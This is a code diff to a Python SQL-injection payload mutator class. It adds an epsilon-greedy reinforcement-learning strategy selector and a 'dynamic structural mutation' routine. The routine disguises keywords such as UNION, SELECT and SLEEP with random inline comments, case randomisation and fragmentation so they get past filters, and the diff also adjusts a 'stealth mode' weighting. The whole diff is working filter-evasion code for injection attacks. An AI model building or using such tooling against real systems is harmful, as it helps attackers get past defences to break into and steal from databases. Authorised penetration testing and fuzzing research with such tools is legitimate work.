@@ -5,6 +5,8 @@ class ASTMutator:
     def __init__(self, context="GENERIC"):
         self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA"]
         self.context = context
+        # RL: Epsilon-Greedy parameters
+        self.epsilon = 0.2  # Exploration rate
         self.strategies = {
             "logical_alts": self._logical_equivalents,
             "inline_comments": self._inline_version_comments,
@@ -13,9 +15,10 @@ class ASTMutator:
             "context_aware": self._context_aware_mutation,
             "directed_bypass": self._directed_keyword_mutation,
             "micro_fragmentation": self._micro_fragmentation,
-            "nested_encoding": self._nested_encoding
+            "nested_encoding": self._nested_encoding,
+            "dynamic_structural": self._dynamic_structural_mutation
         }
-        # Awareness: Track success of each strategy
+        # Awareness: Track success of each strategy (Q-values)
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
         # Gene Credit Assignment: Track reputation of each keyword
         self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
@@ -45,22 +48,25 @@ class ASTMutator:
         # 2. Context-Aware Mutation: Detect and wrap payload if needed
         mutated = self._context_aware_wrap(mutated)
         
-        # 3. Standard Mutations with Weighted Selection
+        # 3. Standard Mutations with RL (Epsilon-Greedy)
         num_mutations = random.randint(1, 2) * intensity
         
-        # Awareness: If in stealth mode, favor stealthy strategies
-        current_weights = dict(self.strategy_weights)
-        if self.stealth_mode:
-            current_weights["context_aware"] *= 2.0
-            current_weights["inline_comments"] *= 2.0
-            current_weights["directed_bypass"] *= 3.0
-            print("[*] Stealth Mode Active: Prioritizing evasive mutations.", flush=True)
-
         for _ in range(num_mutations):
-            # Pick strategy based on weights, ensuring all current strategies have a weight
             names = list(self.strategies.keys())
-            weights = [current_weights.get(n, 1.0) for n in names]
-            strat_name = random.choices(names, weights=weights, k=1)[0]
+            
+            # Epsilon-Greedy Selection
+            if random.random() < self.epsilon:
+                # Explore: Random choice
+                strat_name = random.choice(names)
+            else:
+                # Exploit: Best performing strategy
+                current_weights = dict(self.strategy_weights)
+                if self.stealth_mode:
+                    current_weights["dynamic_structural"] *= 2.0
+                    current_weights["micro_fragmentation"] *= 2.0
+                
+                weights = [current_weights.get(n, 1.0) for n in names]
+                strat_name = random.choices(names, weights=weights, k=1)[0]
             
             self.last_strategy_used = strat_name
             mutated = self.strategies[strat_name](mutated)
@@ -268,4 +274,39 @@ class ASTMutator:
                     encoded_kw = "".join([to_url(c) if random.random() < 0.5 else c for c in kw])
                     mutated = re.sub(rf'\b{kw}\b', encoded_kw, mutated, flags=re.IGNORECASE)
                     
+        return mutated
+
+    def _dynamic_structural_mutation(self, payload):
+        """Dynamic Structural Mutation: Avoids mechanical substitution by generating unique bypass patterns."""
+        mutated = payload
+        
+        # 1. Dynamic Comment Injection (Non-standard patterns)
+        def get_dynamic_comment():
+            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+            content = "".join(random.choices(chars, k=random.randint(2, 5)))
+            patterns = [
+                f"/**/", 
+                f"/*{content}*/", 
+                f"/*!{content}*/", 
+                f"/*--{content}*/",
+                f"/*#*/"
+            ]
+            return random.choice(patterns)
+
+        # 2. Case Randomization (Bypasses simple regex)
+        def randomize_case(word):
+            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in word])
+
+        # Apply to keywords
+        for kw in self.sql_keywords:
+            if kw in mutated.upper():
+                # Don't just replace, mutate the structure
+                options = [
+                    lambda k: f"{randomize_case(k)}",
+                    lambda k: f"{get_dynamic_comment()}{k}{get_dynamic_comment()}",
+                    lambda k: k.replace(" ", get_dynamic_comment()),
+                    lambda k: "".join([c + get_dynamic_comment() if random.random() < 0.3 else c for c in k])
+                ]
+                mutated = re.sub(rf'\b{kw}\b', random.choice(options)(kw), mutated, flags=re.IGNORECASE)
+        
         return mutated
